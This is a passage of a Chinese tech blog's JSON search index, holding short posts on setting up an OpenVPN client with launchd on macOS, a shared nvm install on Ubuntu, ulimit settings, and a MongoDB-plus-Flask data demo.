os桌面下，双击tuntap_20150118.pkg安装\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e3.准备client.conf文件，这个文件就是标准的client端文件\u003c/p\u003e\n\u003cp\u003e4.测试是否可以正常启动\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e/usr/local/opt/openvpn/sbin/openvpn --config /usr/local/etc/openvpn/ddky.conf\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e5.测试成功后在mac os编写plist文件\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003evi /Library/LaunchDaemons/net.openvpn.plist  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u0026lt;?xml \u003cspan class=\"nv\"\u003eversion\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;1.0\u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003eencoding\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;UTF-8\u0026#34;\u003c/span\u003e?\u0026gt;  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u0026lt;!DOCTYPE plist PUBLIC \u003cspan class=\"s2\"\u003e\u0026#34;-//Apple Computer//DTD PLIST 1.0//EN\u0026#34;\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e\u0026#34;http://www.apple.com/DTDs/PropertyList-1.0.dtd\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u0026lt;plist \u003cspan class=\"nv\"\u003eversion\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;1.0\u0026#34;\u003c/span\u003e\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u0026lt;dict\u0026gt;  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u0026lt;key\u0026gt;Label\u0026lt;/key\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u0026lt;string\u0026gt;net.openvpn\u0026lt;/string\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u0026lt;key\u0026gt;KeepAlive\u0026lt;/key\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u0026lt;dict\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                \u0026lt;key\u0026gt;NetworkState\u0026lt;/key\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                \u0026lt;true/\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u0026lt;/dict\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u0026lt;key\u0026gt;Program\u0026lt;/key\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u0026lt;string\u0026gt;/usr/local/opt/openvpn/sbin/openvpn\u0026lt;/string\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u0026lt;key\u0026gt;ProgramArguments\u0026lt;/key\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u0026lt;array\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                \u0026lt;string\u0026gt;openvpn\u0026lt;/string\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                \u0026lt;string\u0026gt;--config\u0026lt;/string\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                \u0026lt;string\u0026gt;/usr/local/etc/openvpn/client.conf\u0026lt;/string\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u0026lt;/array\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u0026lt;key\u0026gt;RunAtLoad\u0026lt;/key\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u0026lt;true/\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u0026lt;key\u0026gt;TimeOut\u0026lt;/key\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u0026lt;integer\u0026gt;90\u0026lt;/integer\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u0026lt;key\u0026gt;WorkingDirectory\u0026lt;/key\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u0026lt;string\u0026gt;/usr/local/etc/openvpn\u0026lt;/string\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u0026lt;/dict\u0026gt;  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u0026lt;/plist\u0026gt;  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e6.然后运行\u003c/p\u003e","title":"mac os下安装openvpn客户端并设置自启动"},{"content":"最近工作比较多在Ubuntu平台下。\n用visualenv和nvm比较多，但是nvm遇到的问题比较多。\n比如jenkins调用nvm就比较麻烦\n如何用用root用户给所有用户都装上统一的nvm呢？\n1、首先安装基本依赖包:\napt-get install build-essential openssl libssl-dev curl 2、建个公共组，这个组的成员可以控制nvm：\ngroupadd dev 3、git克隆下载nvm的代码\ngit clone https://github.com/creationix/nvm.git /opt/nvm 4、建立两个公用目录，一个是放nvm，一个是放nodejs的npm，并设置好权限\nmkdir /usr/local/nvm mkdir /usr/local/node chown -R root:dev /usr/local/nvm chmod -R 775 /usr/local/nvm chown -R root:dev /usr/local/node chmod -R 775 /usr/local/node 5、建立好公用的 /etc/profile.d/nvm.sh 供所有人source用，注意，source命令是bash下用的，如果是sh，就用.替代。\nexport NVM_DIR=/usr/local/nvm source /opt/nvm/nvm.sh export NPM_CONFIG_PREFIX=/usr/local/node export PATH=\u0026#34;/usr/local/node/bin:$PATH\u0026#34; 6、断开重新登录，加载nvm\nnvm --version 7、安装特定版本的node\nnvm install V18.18.2 8、设置缺省node的版本\nnvm alias default V18.18.2 9、随后把用户拉进dev组，然后登陆就可以了。验证命令如下：\nnvm list node -v ","permalink":"https://rendoumi.com/posts/20240119-nvm_forall/","summary":"\u003cp\u003e最近工作比较多在Ubuntu平台下。\u003c/p\u003e\n\u003cp\u003e用visualenv和nvm比较多，但是nvm遇到的问题比较多。\u003c/p\u003e\n\u003cp\u003e比如jenkins调用nvm就比较麻烦\u003c/p\u003e\n\u003cp\u003e如何用用root用户给所有用户都装上统一的nvm呢？\u003c/p\u003e\n\u003cp\u003e1、首先安装基本依赖包:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eapt-get install build-essential openssl libssl-dev curl  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e2、建个公共组，这个组的成员可以控制nvm：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egroupadd dev  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e3、git克隆下载nvm的代码\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egit clone https://github.com/creationix/nvm.git /opt/nvm  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e4、建立两个公用目录，一个是放nvm，一个是放nodejs的npm，并设置好权限\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emkdir /usr/local/nvm  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emkdir /usr/local/node  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003echown -R root:dev /usr/local/nvm  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003echmod -R \u003cspan class=\"m\"\u003e775\u003c/span\u003e /usr/local/nvm  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003echown -R root:dev /usr/local/node  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003echmod -R \u003cspan class=\"m\"\u003e775\u003c/span\u003e /usr/local/node  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e5、建立好公用的 /etc/profile.d/nvm.sh 供所有人source用，注意，source命令是bash下用的，如果是sh，就用.替代。\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eexport\u003c/span\u003e \u003cspan class=\"nv\"\u003eNVM_DIR\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e/usr/local/nvm  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003esource\u003c/span\u003e /opt/nvm/nvm.sh\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eexport\u003c/span\u003e \u003cspan class=\"nv\"\u003eNPM_CONFIG_PREFIX\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e/usr/local/node  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eexport\u003c/span\u003e \u003cspan class=\"nv\"\u003ePATH\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;/usr/local/node/bin:\u003c/span\u003e\u003cspan class=\"nv\"\u003e$PATH\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e6、断开重新登录，加载nvm\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003envm --version\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e7、安装特定版本的node\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003envm install V18.18.2\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e8、设置缺省node的版本\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003envm \u003cspan class=\"nb\"\u003ealias\u003c/span\u003e default V18.18.2  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e9、随后把用户拉进dev组，然后登陆就可以了。验证命令如下：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003envm list  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enode -v\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","title":"Ubuntu下如何给所有用户安装nodejs的nvm"},{"content":"基本常识，各种语焉不详啊，其实ulimit最常用的就两个参数\n-u number: 单个用户能运行的最大进程数 -n number: 单个进程可以同时打开的文件描述符的最大值，缺省1024 有两个地方需要设置，Hard和Soft，Hard是Soft的最高限值，天花板。这两个值都可以针对某用户单独设置。\n所以设法如下：\nulimit -S -n 10240 ulimit -H -n 20480 ulimit -S -u 10240 ulimit -H -u 20480 可以在/etc/security/limits.conf里设置\n* soft nofile 65536 * hard nofile 65536 * soft nproc 131072 * hard nproc 131072 也可以在/etc/rc.d/rc.local中用命令设置\ncat /etc/rc.d/rc.local ... ulimit -u 204800 -HSn 204800 ... ","permalink":"https://rendoumi.com/posts/20240118-ulimit/","summary":"\u003cp\u003e基本常识，各种语焉不详啊，其实ulimit最常用的就两个参数\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e-u number:  单个用户能运行的最大进程数\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e-n number:  单个进程可以同时打开的文件描述符的最大值，缺省1024\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e有两个地方需要设置，Hard和Soft，Hard是Soft的最高限值，天花板。这两个值都可以针对某用户单独设置。\u003c/p\u003e\n\u003cp\u003e所以设法如下：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eulimit\u003c/span\u003e -S -n \u003cspan class=\"m\"\u003e10240\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eulimit\u003c/span\u003e -H -n \u003cspan class=\"m\"\u003e20480\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eulimit\u003c/span\u003e -S -u \u003cspan class=\"m\"\u003e10240\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eulimit\u003c/span\u003e -H -u \u003cspan class=\"m\"\u003e20480\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e可以在/etc/security/limits.conf里设置\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e* soft nofile \u003cspan class=\"m\"\u003e65536\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e* hard nofile \u003cspan class=\"m\"\u003e65536\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e* soft nproc \u003cspan class=\"m\"\u003e131072\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e* hard nproc \u003cspan class=\"m\"\u003e131072\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e也可以在/etc/rc.d/rc.local中用命令设置\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ecat /etc/rc.d/rc.local  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e...\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eulimit\u003c/span\u003e -u \u003cspan class=\"m\"\u003e204800\u003c/span\u003e -HSn \u003cspan class=\"m\"\u003e204800\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e...\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch4\u003e\u003c/h4\u003e","title":"ulimit的用法"},{"content":"首先是安装mongodb\nyum install -y mongodb-server mongodb Installing for dependencies: boost-filesystem boost-iostreams boost-program-options boost-system boost-thread gperftools-libs libicu libunwind v8 会装一堆依赖包，boost库，icu库，v8库，gperftools库，都是很厉害的库啊！\n启动：\nservice mongod start 导入海量数据：\n[root@ovs-16-11-2 ~]# mongoimport -d mydb -c prj01 --type csv --file opendata_projects.csv --headerline connected to: 127.0.0.1 Thu Jul 28 09:50:47.002 Progress: 39118658/470754183 8% Thu Jul 28 09:50:47.002 74400 24800/second Thu Jul 28 09:50:50.033 Progress: 80042213/470754183 17% Thu Jul 28 09:50:50.033 150700 25116/second Thu Jul 28 09:50:53.145 Progress: 108143323/470754183 22% Thu Jul 28 09:50:53.145 202700 22522/second Thu Jul 28 09:50:56.004 Progress: 149781879/470754183 31% Thu Jul 28 09:50:56.004 280000 23333/second Thu Jul 28 09:50:59.001 Progress: 179705162/470754183 38% Thu Jul 28 09:50:59.001 336200 22413/second Thu Jul 28 09:51:03.385 Progress: 212197023/470754183 45% Thu Jul 28 09:51:03.385 396400 20863/second Thu Jul 28 09:51:06.015 Progress: 236552399/470754183 50% Thu Jul 28 09:51:06.015 441700 20077/second Thu Jul 28 09:51:09.299 Progress: 264365847/470754183 56% Thu Jul 28 09:51:09.299 493300 19732/second Thu Jul 28 09:51:12.001 Progress: 304790148/470754183 64% Thu Jul 28 09:51:12.001 568500 20303/second Thu Jul 28 09:51:15.033 Progress: 323508057/470754183 68% Thu Jul 28 09:51:15.033 603300 19461/second Thu Jul 28 09:51:18.607 Progress: 361610334/470754183 76% Thu Jul 28 09:51:18.607 674200 19829/second Thu Jul 28 09:51:21.000 Progress: 393748962/470754183 83% Thu Jul 28 09:51:21.000 733700 19829/second Thu Jul 28 09:51:24.007 Progress: 427667505/470754183 90% Thu Jul 28 09:51:24.007 796900 19922/second Thu Jul 28 09:51:27.001 Progress: 459658299/470754183 97% Thu Jul 28 09:51:27.001 857300 19937/second Thu Jul 28 09:51:27.793 check 9 878853 Thu Jul 28 09:51:27.979 imported 878852 objects 进入命令行，看看库的整体情况：\nmongo use mydb show collections db.prj01.findOne() 完整结果如下：\nmongo MongoDB shell version: 2.4.14 connecting to: test \u0026gt; use mydb switched to db mydb \u0026gt; show collections prj01 system.indexes \u0026gt; db.prj01.findOne() { \u0026#34;_id\u0026#34; : ObjectId(\u0026#34;579964f41d36d69d1752f82b\u0026#34;), \u0026#34;_projectid\u0026#34; : \u0026#34;7342bd01a2a7725ce033a179d22e382d\u0026#34;, \u0026#34;_teacher_acctid\u0026#34; : \u0026#34;5c43ef5eac0f5857c266baa1ccfa3d3f\u0026#34;, \u0026#34;_schoolid\u0026#34; : \u0026#34;9e72d6f2f1e9367b578b6479aa5852b7\u0026#34;, \u0026#34;school_ncesid\u0026#34; : NumberLong(\u0026#34;360009702803\u0026#34;), \u0026#34;school_latitude\u0026#34; : 40.688454, \u0026#34;school_longitude\u0026#34; : -73.910432, \u0026#34;school_city\u0026#34; : \u0026#34;Brooklyn\u0026#34;, \u0026#34;school_state\u0026#34; : \u0026#34;NY\u0026#34;, \u0026#34;school_zip\u0026#34; : 11207, \u0026#34;school_metro\u0026#34; : \u0026#34;urban\u0026#34;, \u0026#34;school_district\u0026#34; : \u0026#34;New York City Dept Of Ed\u0026#34;, \u0026#34;school_county\u0026#34; : \u0026#34;Kings (Brooklyn)\u0026#34;, \u0026#34;school_charter\u0026#34; : \u0026#34;f\u0026#34;, \u0026#34;school_magnet\u0026#34; : \u0026#34;t\u0026#34;, \u0026#34;school_year_round\u0026#34; : \u0026#34;f\u0026#34;, \u0026#34;school_nlns\u0026#34; : \u0026#34;f\u0026#34;, \u0026#34;school_kipp\u0026#34; : \u0026#34;f\u0026#34;, \u0026#34;school_charter_ready_promise\u0026#34; : \u0026#34;f\u0026#34;, \u0026#34;teacher_prefix\u0026#34; : \u0026#34;Mr.\u0026#34;, \u0026#34;teacher_teach_for_america\u0026#34; : \u0026#34;f\u0026#34;, \u0026#34;teacher_ny_teaching_fellow\u0026#34; : \u0026#34;f\u0026#34;, \u0026#34;primary_focus_subject\u0026#34; : \u0026#34;Other\u0026#34;, \u0026#34;primary_focus_area\u0026#34; : \u0026#34;Applied Learning\u0026#34;, \u0026#34;secondary_focus_subject\u0026#34; : \u0026#34;\u0026#34;, \u0026#34;secondary_focus_area\u0026#34; : \u0026#34;\u0026#34;, \u0026#34;resource_type\u0026#34; : \u0026#34;Supplies\u0026#34;, \u0026#34;poverty_level\u0026#34; : \u0026#34;highest poverty\u0026#34;, \u0026#34;grade_level\u0026#34; : \u0026#34;Grades 6-8\u0026#34;, \u0026#34;vendor_shipping_charges\u0026#34; : \u0026#34;\u0026#34;, \u0026#34;sales_tax\u0026#34; : \u0026#34;\u0026#34;, \u0026#34;payment_processing_charges\u0026#34; : \u0026#34;\u0026#34;, \u0026#34;fulfillment_labor_materials\u0026#34; : \u0026#34;\u0026#34;, \u0026#34;total_price_excluding_optional_support\u0026#34; : 229, \u0026#34;total_price_including_optional_support\u0026#34; : 279.27, \u0026#34;students_reached\u0026#34; : 0, \u0026#34;total_donations\u0026#34; : 251, \u0026#34;num_donors\u0026#34; : 1, \u0026#34;eligible_double_your_impact_match\u0026#34; : \u0026#34;f\u0026#34;, \u0026#34;eligible_almost_home_match\u0026#34; : \u0026#34;f\u0026#34;, \u0026#34;funding_status\u0026#34; : \u0026#34;completed\u0026#34;, \u0026#34;date_posted\u0026#34; : \u0026#34;2002-09-13 00:00:00\u0026#34;, \u0026#34;date_completed\u0026#34; : \u0026#34;2002-09-23 00:00:00\u0026#34;, \u0026#34;date_thank_you_packet_mailed\u0026#34; : \u0026#34;2003-01-27 00:00:00\u0026#34;, \u0026#34;date_expiration\u0026#34; : \u0026#34;2003-12-31 00:00:00\u0026#34; } \u0026gt; 太多字段了，如果我们就想要其中的6个字段：\n\u0026gt; db.prj01.findOne({}, {school_state:1, resource_type:1, poverty_level:1, date_posted:1, total_donations:1, funding_status:1, _id:0}) { \u0026#34;school_state\u0026#34; : \u0026#34;NY\u0026#34;, \u0026#34;resource_type\u0026#34; : \u0026#34;Supplies\u0026#34;, \u0026#34;poverty_level\u0026#34; : \u0026#34;highest poverty\u0026#34;, \u0026#34;total_donations\u0026#34; : 251, \u0026#34;funding_status\u0026#34; : \u0026#34;completed\u0026#34;, \u0026#34;date_posted\u0026#34; : \u0026#34;2002-09-13 00:00:00\u0026#34; } 装个pymongo\npython -m pip install pymongo 测一下，进入python命令行：\npython ... from pymongo import MongoClient MONGODB_HOST = \u0026#39;localhost\u0026#39; MONGODB_PORT = 27017 DBS_NAME = \u0026#39;mydb\u0026#39; COLLECTION_NAME = \u0026#39;prj01\u0026#39; FIELDS = {\u0026#39;school_state\u0026#39;: True, \u0026#39;resource_type\u0026#39;: True, \u0026#39;poverty_level\u0026#39;: True, \u0026#39;date_posted\u0026#39;: True, \u0026#39;total_donations\u0026#39;: True, \u0026#39;_id\u0026#39;: False} connection = MongoClient(MONGODB_HOST, MONGODB_PORT) collection = connection[DBS_NAME][COLLECTION_NAME] projects = collection.find(projection=FIELDS) for project in projects: print project ... {u\u0026#39;school_state\u0026#39;: u\u0026#39;MO\u0026#39;, u\u0026#39;date_posted\u0026#39;: u\u0026#39;2015-08-18 00:00:00\u0026#39;, u\u0026#39;poverty_level\u0026#39;: u\u0026#39;highest poverty\u0026#39;, u\u0026#39;resource_type\u0026#39;: u\u0026#39;Books\u0026#39;, u\u0026#39;total_donations\u0026#39;: 0} ... 数据会疯狂显示一阵子，其实这就是一个完整的python访问mongodb的程序了。\n下面我们来完成flask的部分\n装个flask\npython -m pip install flask 建立个文件夹flask01，建立目录templates\nflask01 ├── run.py └── templates └── index.html 准备一个首页文件index.html放到目录templates下\ncat index.html \u0026lt;h1\u0026gt;Hello World\u0026lt;/h1\u0026gt; 准备主程序run.py\nfrom flask import Flask from flask import render_template app = Flask(__name__) @app.route(\u0026#34;/\u0026#34;) def index(): return render_template(\u0026#34;index.html\u0026#34;) if __name__ == \u0026#34;__main__\u0026#34;: app.run(host=\u0026#39;0.0.0.0\u0026#39;,port=5000,debug=True) 分配个url来存取mongodb\nfrom flask import Flask from flask import render_template from pymongo import MongoClient import json from bson import json_util from bson.json_util import dumps app = Flask(__name__) MONGODB_HOST = \u0026#39;localhost\u0026#39; MONGODB_PORT = 27017 DBS_NAME = \u0026#39;mydb\u0026#39; COLLECTION_NAME = \u0026#39;prj01\u0026#39; FIELDS = {\u0026#39;school_state\u0026#39;: True, \u0026#39;resource_type\u0026#39;: True, \u0026#39;poverty_level\u0026#39;: True, \u0026#39;date_posted\u0026#39;: True, \u0026#39;total_donations\u0026#39;: True, \u0026#39;_id\u0026#39;: False} @app.route(\u0026#34;/\u0026#34;) def index(): return render_template(\u0026#34;index.html\u0026#34;) @app.route(\u0026#34;/mydb/prj01\u0026#34;) def mydb_prj01(): connection = MongoClient(MONGODB_HOST, MONGODB_PORT) collection = connection[DBS_NAME][COLLECTION_NAME] projects = collection.find(projection=FIELDS) json_projects = [] for project in projects: json_projects.append(project) json_projects = json.dumps(json_projects, default=json_util.default) connection.close() return json_projects if __name__ == \u0026#34;__main__\u0026#34;: app.run(host=\u0026#39;0.0.0.0\u0026#39;,port=5000,debug=True) 运行一下，在浏览器打开这个url：\npython run.py * Running on http://0.0.0.0:5000/ (Press CTRL+C to quit) * Restarting with stat * Debugger is active! * Debugger pin code: 373-144-494 172.16.8.1 - - [28/Jul/2016 10:13:27] \u0026#34;GET /mydb/prj01 HTTP/1.1\u0026#34; 200 - 结果很明显是个json\n[{\u0026#34;school_state\u0026#34;: \u0026#34;NY\u0026#34;, \u0026#34;date_posted\u0026#34;: \u0026#34;2002-09-13 00:00:00\u0026#34;, \u0026#34;poverty_level\u0026#34;: \u0026#34;highest 